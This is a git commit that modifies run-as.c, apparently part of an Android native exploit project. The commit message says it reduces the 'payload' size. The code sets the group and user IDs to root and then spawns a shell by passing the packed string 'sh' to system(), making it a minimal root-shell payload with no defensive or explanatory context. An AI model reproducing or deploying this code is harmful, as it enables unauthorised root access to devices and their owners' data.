8b25d9be86723eee676453205d99acdfc60bdc8e
CsvUpdater <psp1080p@googlemail.com>
2025-03-27 08:21:48 +0000

    Reduce payload to 1756 bytes

--- native_c/jni/run-as.c
+++ native_c/jni/run-as.c
@@ -1,10 +1,10 @@
 int setresgid(int, int, int);
 int setresuid(int, int, int);
-int system(char*);
+int system(const int*);
 void _start()
 {
-	short cmd = 0x6873;
+	const int cmd = 0x6873; // 'sh'
 	setresgid(0, 0, 0);
 	setresuid(0, 0, 0);
-	system((char*)&cmd);
+	system(&cmd);
 }
